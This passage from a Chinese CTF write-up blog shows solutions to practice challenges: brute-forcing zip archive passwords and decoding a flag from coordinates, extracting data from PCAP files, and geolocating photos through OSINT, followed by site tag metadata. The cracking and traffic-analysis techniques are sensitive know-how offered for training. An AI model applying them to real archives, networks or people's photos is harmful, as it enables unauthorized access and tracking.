dict_path)print(&quot;所有找到的密码:&quot;, passwords) 注意，爆破到dwarf_vault_1.zip经常会返回奇怪的ERROR，所以这里的代码逻辑最好是在遇到意外ERROR时直接终止爆破并将现有的所有密码先写进txt文件，不然容易卡在这里重复很多次。 再成功解压dwarf_vault_1.zip后，我们会得到2份文件：drop_pod.py以及mining_report.txt。 txt文件的内容为： 1Mining report - flag coordinates: ectf&#123;[[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]&#125; 用coordinate将flag表示了出来。于是来检查drop_pod.py的内容： 12345678910111213141516171819202122232425262728293031323334#Maybe the flag was the friends we made along the waypassword = &quot; &quot;flag = &quot;FAKE FLAG THIS IS NOT REAL&quot;def find_positions(flag, crew_list): positions = [] for char in flag: if char == &quot;_&quot;: positions.append(&quot;_&quot;) continue found = False for i, name in enumerate(crew_list): if char.lower() in name.lower(): positions.append([i, name.lower().index(char.lower())]) found = True break if not found: positions.append([None, None]) return positionspositions = find_positions(flag, password.split())output_text = &quot;Mining report - flag coordinates: ectf&#123;&quot; + str(positions) + &quot;&#125;&quot;with open(&quot;mining_report.txt&quot;, &quot;w&quot;) as file: file.write(output_text)print(&quot;Rock and Stone! Report written to mining_report.txt:&quot;, output_text) 是这段坐标的生成逻辑。所以可以编写一段代码，靠我们刚才保存的所有压缩密码来还原flag： 123456789101112131415161718192021222324252627with open(&quot;found_passwords.txt&quot;, &quot;r&quot;) as file: reversed_passwords = file.readlines()# 去除换行符并反转列表（因为我们爆破时是从200开始的，所以这里需要反过来）password_list = [line.strip() for line in reversed_passwords][::-1]#txt里的内容positions = [[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]# 还原 flagflag = &quot;&quot;for pos in positions: if pos == &quot;_&quot;: flag += &quot;_&quot; else: i, j = pos if 0 &lt;= i &lt; len(password_list) and 0 &lt;= j &lt; len(password_list[i]): flag += password_list[i][j] else: flag += &quot;?&quot; # 标记错误或缺失数据# 输出结果print(&quot;flag:&quot;, &quot;ectf&#123;&quot; + flag + &quot;&#125;&quot;)# flag: ectf&#123;d1ggy_d1ggy_h0l3&#125; 5. ForensicMy dearest 我们会得到一份docx文件，也就是word文件。打开后在信息的作者处即可找到文件作者： 根据题目要求，flag为： 1ectf&#123;MichelTeller&#125; Capture the hidden 这道题我们会得到一份.pcap文件，用Wireshark打开它。 由于是要找一份文件，我们先点击“文件” -&gt; “导出对象” -&gt; “HTTP”： 确实发现了一份上传的文件。可以点击保存它，但是打开会发现内容不不完整： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1N 于是我们找这份文件在纪录里的具体位置： 可以看到我们保存的upload的文件内容只有蓝色部分，当我们将后续的内容也提出来，便会得到完整的flag： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ==-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125; Just a PCAP 这道题也是一份pcap文件，再次用Wireshark打开。 但是用之前的操作：“文件” -&gt; “导出对象” -&gt; “HTTP”，并不会发现任何东西。（实际上是因为这段纪录里并没有任何HTTP传输的内容。） 这时我们仔细观察第一条纪录的info会发现它是以”89504E47“，这是非常典型的PNG文件的文件头（因为它对应ASCII字符“‰PNG”），所以我们猜测这些纪录的info内容可以拼成一份完整的PNG文件。我们用这段代码将所有纪录的info内容提取出来并且保存成.png：（这段代码能运行的前提条件是下载了Wireshark\\的tshark.exe 123456789101112131415import pysharkimport pyshark.packetfrom binascii import unhexlifycapture = pyshark.FileCapture(&#x27;justapcap.pcap&#x27;, tshark_path=&#x27;D:\\\\Program Files\\\\Wireshark\\\\tshark.exe&#x27;) # 将这个路径替换成自己电脑上tshark.exe的路径hexstr = &quot;&quot;cnt = 0for packet in capture: s = str(packet) cur = s.split(&quot;Name:&quot;)[-1].split(&quot;.&quot;)[0].split(&quot;1m &quot;)[1] hexstr += curhexstr = hexstr.split(&quot;exam&quot;)[0]with open(&quot;a.png&quot;,&quot;wb&quot;) as f: f.write(unhexlify(hexstr)) 然后就会得到这张图片： 1ectf&#123;DN5_3xf1ltr@t10n_15_flnd3d&#125; 6. OsintProject-153-Q1 这道题我们会得到这张图片： 通过谷歌识图可以很轻易地知道这个地方是：Falls Caramy, 法语原名为Chutes_du_Caramy。 得到flag： 1ectf&#123;Chutes_du_Caramy&#125; Project-153-Q2 这道题我们会得到这张图片： 通过谷歌识图可以判断出来这张照片是在 Massif de l’Esterel 附近拍摄的。 但由于题目要求的是拍摄时所处的具体位置，所以我们还需要找些其他的线索。 注意到图片远处这里，有一座全是房子的半岛： 于是我们打开Google Earth，查看Massif de l’Esterel附近的海岸线。可以发现这个地方非常想图中的半岛： 并且点开 Calanque de l’Esterel, 83700 Saint-Raphaël, 法国 的相册可以看到这样一张图片： 跟我们图片里的一模一样。沿着这个方向依次尝试带有名字的地点，便可以成功找到拍摄地：Pointe de l’Observatoire, D559, 83700 Saint-Raphaël, 法国。 1ectf&#123;Pointe_de_l&#x27;Observatoire&#125; Project-153-Q3 这道题我们会得到这张图片： 再次通过谷歌识图可以发现图片所在地是 Rocher de Roquebrune： 在Google Earth找到这里 便可以在相册里发现这张图片，大概率是题目所指的“monster： 所以答案为左下角的作者名字。 1ectf&#123;Michael_DELAETER&#125; Project-153-Q4 首先通过谷歌识图判断出照片所在地应该是：Bormes-les-Mimosas 在Google Earth找到这里： 根据照片拍摄角度以及题目描述不难猜出远处的那座岛应该是 Île du Levant。 1ectf&#123;Île_du_Levant&#125; Project-153-Q5 这道题我们会得到这张图片： /OSINT_1_-_question-5/PANO_20220408_134922.jpg) 这道题会碰到一个非常有意思的事情。我们拿到的图片的文件大小为29.8 MB，而谷歌识图的上限为20MB，所以我们首先需要压缩一下图片的大小才能使用谷歌识图。我这里是用微信来进行有损压缩的。 然后便可以用谷歌识图来确认地点： 1ectf&#123;Gros_Cerveau&#125; (在法语中，“le” 是阳性单数定冠词，所以不包含在答案内。) Project-153-Q6 这道题我们会得到这张图片： 再次通过谷歌识图我们可以找到这样一条Instergram： （为了防止侵犯个人隐私我给图片打了个码。） 于是可以得知这张照片的拍摄所在地为 Moustiers-Sainte-Marie （zipcode：04360）。 至于台阶数可以直接利用开了联网功能的ChatGPT所搜即可： 最后的flag为： 1ectf&#123;262_04360&#125; PNJ - 3 - Gouzou 这道题我们会得到一个文件夹，里面有非常多的文件，它说的这个“the”属实是有点意义不明，所以我们先去搜索看一下GOUZOU是什么： 发现是法国艺术家JACE创作一个没有五官的诙谐卡通形象。根据这条线索我们可以锁定这张图片（也就是说我们需要找的应该是这张图片的具体位置）： 根据谷歌识图可以发现这张照片在 “Île de Ré”（雷岛）： 通过搜索“île de ré gouzou”可以找到这个网页：https://www.realahune.fr/les-murs-dexpression-de-latlantique/，并且发现： 于是我们确定这幅画是在”la digue du Boutillon, île de Ré”(是一座防波堤)，得到flag： 1ectf&#123;digue_du_boutillon&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"},{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"},{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Theoretische Informatik 理论信息学","slug":"TUM-info-课程笔记/Theoretische-Informatik-理论信息学","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"},{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"概率论 Probability Theory","slug":"TUM-数学-笔记/概率论-Probability-Theory","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"},{"name":"密码学 Kryptografie","slug":"TUM-info-课程笔记/密码学-Kryptografie","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6-Kryptografie/"},{"name":"量子计算 Quantum Computing","slug":"TUM-info-课程笔记/量子计算-Quantum-Computing","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97-Quantum-Computing/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"},{"name":"Dantenbank 数据库","slug":"TUM-info-课程笔记/Dantenbank-数据库","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Zero-knowledge proofs","slug":"Zero-knowledge-proofs","permalink":"https://archer-baiyi.github.io/tags/Zero-knowledge-proofs/"},{"name":"零知识证明","slug":"零知识证明","permalink":"https://archer-baiyi.github.io/tags/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"Python","slug":"Python","permalink":"https://archer-baiyi.github.io/tags/Python/"},{"name":"eval()","slug":"eval","permalink":"https://archer-baiyi.github.io/tags/eval/"},{"name":"Ocaml","slug":"Ocaml","permalink":"https://archer-baiyi.github.io/tags/Ocaml/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://archer-baiyi.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"Format String","slug":"Format-String","permalink":"https://archer-baiyi.github.io/tags/Format-String/"},{"name":"C","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"tool","slug":"tool","permalink":"https://archer-baiyi.github.io/tags/tool/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"},{"name":"python","slug":"python","permalink":"https://archer-baiyi.github.io/tags/python/"},{"name":"decode","slug":"decode","permalink":"https://archer-baiyi.github.io/tags/decode/"},{"name":"解码","slug":"解码","permalink":"https://archer-baiyi.github.io/tags/%E8%A7%A3%E7%A0%81/"},{"name":"base 64","slug":"base-64","permalink":"https://archer-baiyi.github.io/tags/base-64/"},{"name":"Theoretische Informatik","slug":"Theoretische-Informatik","permalink":"https://archer-baiyi.github.io/tags/Theoretische-Informatik/"},{"name":"理论信息学","slug":"理论信息学","permalink":"https://archer-baiyi.github.io/tags/%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"},{"name":"概率论","slug":"概率论","permalink":"https://archer-baiyi.github.io/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/tags/Probability-Theory/"},{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Malbolge","slug":"Malbolge","permalink":"https://archer-baiyi.github.io/tags/Malbolge/"},{"name":"密码学","slug":"密码学","permalink":"https://archer-baiyi.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Quantum Computing","slug":"Quantum-Computing","permalink":"https://archer-baiyi.github.io/tags/Quantum-Computing/"},{"name":"量子计算","slug":"量子计算","permalink":"https://archer-baiyi.github.io/tags/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/"},{"name":"AES","slug":"AES","permalink":"https://archer-baiyi.github.io/tags/AES/"},{"name":"ECB","slug":"ECB","permalink":"https://archer-baiyi.github.io/tags/ECB/"},{"name":"CBC","slug":"CBC","permalink":"https://archer-baiyi.github.io/tags/CBC/"},{"name":"CTR","slug":"CTR","permalink":"https://archer-baiyi.github.io/tags/CTR/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"binary","slug":"binary","permalink":"https://archer-baiyi.github.io/tags/binary/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/tags/RSA/"},{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"进程","slug":"进程","permalink":"https://archer-baiyi.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://archer-baiyi.github.io/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"Mutex","slug":"Mutex","permalink":"https://archer-baiyi.github.io/tags/Mutex/"},{"name":"Semaphore","slug":"Semaphore","permalink":"https://archer-baiyi.github.io/tags/Semaphore/"},{"name":"Petri-Netz","slug":"Petri-Netz","permalink":"https://archer-baiyi.github.io/tags/Petri-Netz/"},{"name":"synchron","slug":"synchron","permalink":"https://archer-baiyi.github.io/tags/synchron/"},{"name":"asynchron","slug":"asynchron","permalink":"https://archer-baiyi.github.io/tags/asynchron/"},{"name":"signal","slug":"signal","permalink":"https://archer-baiyi.github.io/tags/signal/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://archer-baiyi.github.io/tags/MongoDB/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"switch","slug":"switch","permalink":"https://archer-baiyi.github.io/tags/switch/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"},{"name":"html","slug":"html","permalink":"https://archer-baiyi.github.io/tags/html/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"内存管理","slug":"内存管理","permalink":"https://archer-baiyi.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"Paging","slug":"Paging","permalink":"https://archer-baiyi.github.io/tags/Paging/"},{"name":"Page table","slug":"Page-table","permalink":"https://archer-baiyi.github.io/tags/Page-table/"},{"name":"Ersetztungsstrategie","slug":"Ersetztungsstrategie","permalink":"https://archer-baiyi.github.io/tags/Ersetztungsstrategie/"},{"name":"RCE","slug":"RCE","permalink":"https://archer-baiyi.github.io/tags/RCE/"},{"name":"JWT","slug":"JWT","permalink":"https://archer-baiyi.github.io/tags/JWT/"},{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"逻辑电路图","slug":"逻辑电路图","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"逻辑门","slug":"逻辑门","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"},{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/tags/wsl/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/tags/sage/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/tags/vscode/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/tags/Cookie/"},{"name":"Fermat","slug":"Fermat","permalink":"https://archer-baiyi.github.io/tags/Fermat/"},{"name":"PEM","slug":"PEM","permalink":"https://archer-baiyi.github.io/tags/PEM/"},{"name":"CRT","slug":"CRT","permalink":"https://archer-baiyi.github.io/tags/CRT/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/tags/Piet/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/tags/SQL-Injection/"},{"name":"PHP 代码注入","slug":"PHP-代码注入","permalink":"https://archer-baiyi.github.io/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/tags/sortings/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/tags/Jinja2/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/tags/Mako/"},{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"cpp","slug":"cpp","permalink":"https://archer-baiyi.github.io/tags/cpp/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"},{"name":"文件系统","slug":"文件系统","permalink":"https://archer-baiyi.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"输入/输出","slug":"输入-输出","permalink":"https://archer-baiyi.github.io/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://archer-baiyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/tags/RISC-V/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/tags/container/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/tags/Database/"},{"name":"数据库","slug":"数据库","permalink":"https://archer-baiyi.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/tags/remote/"},{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]}